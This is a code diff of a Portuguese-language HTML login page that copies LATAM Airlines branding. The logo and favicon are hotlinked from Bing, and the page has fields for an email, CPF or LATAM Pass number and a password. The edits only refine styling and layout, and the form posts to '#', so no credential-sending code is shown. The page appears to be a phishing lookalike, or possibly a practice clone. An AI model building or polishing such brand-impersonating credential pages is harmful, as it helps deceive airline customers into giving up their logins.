@@ -4,14 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Faça seu Login | LATAM AIRLINES</title>
-    <link rel="icon" href="https://th.bing.com/th/id/OIP.pawmiYLYxeNk4mrlvyIlqAHaL4?
-
-rs=1&pid=ImgDetMain">
+    <link rel="icon" href="https://th.bing.com/th/id/OIP.pawmiYLYxeNk4mrlvyIlqAHaL4?rs=1&pid=ImgDetMain">
     <style>
         body {
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
+            background-color: #f0f0f0;
         }
         .container {
             width: 50%;
@@ -20,27 +19,32 @@ rs=1&pid=ImgDetMain">
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
         }
         form {
-            text-align: center;
+            text-align: left;
         }
         form input {
             margin-bottom: 10px;
-            width: 100%;
+            width: calc(100% - 20px); /* Deixar um espaço de 10px em cada lado */
             padding: 10px;
             box-sizing: border-box;
             border: 1px solid #ccc;
             border-radius: 5px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
         }
         form textarea {
             margin-bottom: 10px;
-            width: 100%;
+            width: calc(100% - 20px); /* Deixar um espaço de 10px em cada lado */
             padding: 10px;
             box-sizing: border-box;
             border: 1px solid #ccc;
             border-radius: 5px;
             resize: none;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
         }
         form button {
             width: 150px; /* Defina o tamanho desejado */
@@ -50,33 +54,30 @@ rs=1&pid=ImgDetMain">
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            margin: 0 auto; /* Centraliza o botão horizontalmente */
+            margin: 20px auto 0; /* Centraliza o botão horizontalmente e adiciona margem superior */
             display: block; /* Para que a margem funcione */
         }
         .logo {
             width: 100px; /* Defina o tamanho desejado */
-            margin: 0 auto 20px; /* Centraliza a imagem e adiciona margem inferior */
-            display: block; /* Para que a margem funcione */
+            margin-bottom: 20px;
+        }
+        .texto-superior {
+            color: rgb(27, 0, 136);
+            margin-bottom: 10px;
+        }
+        .texto-inferior {
+            color: rgb(48, 48, 48);
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <form action="#" method="post">
-            <img src="https://th.bing.com/th/id/R.8c29d58fe7dc2c144922bc2c2c07d008?
-
-rik=9EVDOKvltMk8Kg&amp;riu=http%3a%2f%2flogos-download.com%2fwp-content%2fuploads
-
-%2f2016%2f12%2fLATAM_Airlines_logo_wordmark.png&amp;ehk=KoMMi4amEshpJz3dL4OUfFcHwZ
-
-%2b32OLiAE591EJWXs4%3d&amp;risl=&amp;pid=ImgRaw&amp;r=0" alt="Logo da LATAM Airlines" 
-
-class="logo">
-            <p>Insira seu usuário:</p>
-<p>Dê preferência ao seu número LATAM Pass ao inserir seus dados:</p>
-            <input type="email" name="username" placeholder="Email, CPF ou Número de 
-
-cliente">
+            <img src="https://th.bing.com/th/id/R.8c29d58fe7dc2c144922bc2c2c07d008?rik=9EVDOKvltMk8Kg&riu=http%3a%2f%2flogos-download.com%2fwp-content%2fuploads%2f2016%2f12%2fLATAM_Airlines_logo_wordmark.png&ehk=KoMMi4amEshpJz3dL4OUfFcHwZ%2b32OLiAE591EJWXs4%3d&risl=&pid=ImgRaw&r=0" alt="Logo da LATAM Airlines" class="logo">
+            <p class="texto-superior">Insira seu usuário:</p>
+            <p class="texto-inferior">Dê preferência ao seu número LATAM Pass ao inserir seus dados:</p>
+            <input type="email" name="username" placeholder="Email, CPF ou Número de cliente">
             <input type="password" name="password" placeholder="Senha">
             <button type="submit">Continuar</button>
         </form>
